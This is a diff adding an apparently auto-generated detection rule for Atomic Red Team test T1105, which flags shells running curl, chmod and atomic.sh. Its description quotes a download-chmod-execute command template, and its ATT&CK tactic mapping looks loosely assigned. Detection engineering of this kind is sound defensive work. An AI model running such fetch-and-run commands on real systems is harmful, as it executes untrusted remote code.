@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'Linux Download File and Run' (GUID: bdc373c5-e9cf-4563-8a7b-a9ba720a90f3) of technique T1105 (Ingress Tool Transfer). Test Description: Utilize linux Curl to download a remote file, chmod +x it and run it.. Command/Steps: curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}\n"
+from = "now-9m"
+rule_id = "671dbe14-af6d-4e6c-aa47-825ba16c5cb6"
+language = "kql"
+name = "Atomic Test: T1105 - Linux Download File and Run"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1105/T1105.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1105", "bdc373c5-e9cf-4563-8a7b-a9ba720a90f3", "linux",]
+type = "query"
+query = "(process.name : (\\\"sh\\\", \\\"bash\\\") OR process.parent.name : (\\\"sh\\\", \\\"bash\\\")) AND process.command_line : \\\"*curl*\\\" AND process.command_line : \\\"*chmod*\\\" AND process.command_line : \\\"*atomic.sh*\\\""
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1105"
+name = "Linux Download File and Run"
+reference = "https://attack.mitre.org/techniques/T1105"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1105"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1105"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1105"
+
+
